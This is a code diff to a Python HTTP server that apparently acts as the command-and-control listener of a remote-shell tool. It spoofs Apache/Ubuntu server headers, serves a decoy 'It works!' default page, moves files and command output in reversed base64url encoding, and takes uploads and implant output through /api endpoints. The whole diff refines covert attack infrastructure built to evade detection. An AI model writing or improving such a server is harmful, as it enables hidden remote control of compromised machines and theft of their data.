@@ -31,6 +31,8 @@ banner2 = """
 class MyServer(BaseHTTPRequestHandler):
     def _set_headers(self, code=200):
         self.send_response(code)
+        self.server_version = "Apache/2.4.18"
+        self.sys_version = "(Ubuntu)"
         self.send_header("Content-type", "text/plain")
         self.end_headers()
 
@@ -81,10 +83,9 @@ class MyServer(BaseHTTPRequestHandler):
                     file_content = file.read()
                     encoded_file = "File: "
                     encoded_file += self.encode_file_revbase64url(file_content)
-                self.server_version = "Apache/2.4.18"
-                self.sys_version = "(Ubuntu)"
-                self._set_headers()
-                self.wfile.write(encoded_file.encode("utf-8"))
+                    self._set_headers()
+                    self.wfile.write(encoded_file.encode("utf-8"))
+                    return
 
             elif self.path == "/api/token":
                 while True:
@@ -186,8 +187,6 @@ class MyServer(BaseHTTPRequestHandler):
         global prompt ; global first_run ; global noerror
         global local_path ; global remote_path ; global command
         try:
-            self.sys_version = "(Ubuntu)"
-            self.server_version = "Apache/2.4.18"
             self._set_headers() ; response = "Success"
             content_length = int(self.headers["Content-Length"])
             encoded_data = self.rfile.read(content_length).decode("utf-8")
@@ -199,10 +198,14 @@ class MyServer(BaseHTTPRequestHandler):
             else:
                 decoded_payload = self.decode_reversed_base64url(encoded_payload)
 
-            if self.path == "/api/upload":
+            if self.path == "/api/info":
+                self.wfile.write(response.encode())
+
+            elif self.path == "/api/upload":
                 with open(local_path, "wb") as f:
                     file_content = self.decode_file_revbase64url(encoded_payload)
                     f.write(file_content)
+                    self.wfile.write(response.encode())
                 return
 
             elif self.path == "/api/debug":
@@ -213,6 +216,7 @@ class MyServer(BaseHTTPRequestHandler):
                         print()
                     else:
                         print(colored(decoded_payload.rstrip()+"\n", "yellow"))
+                self.wfile.write(response.encode())
 
             elif self.path == "/api/error":
                 if noerror and command is not None:
@@ -230,7 +234,8 @@ class MyServer(BaseHTTPRequestHandler):
                         print(colored(decoded_payload.rstrip()+"\n", "red"))
                     else:
                         print(colored(decoded_payload.rstrip()+"\n", "red")) 
-            
+                self.wfile.write(response.encode())
+
             else:
                 itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                 self.send_response(200)
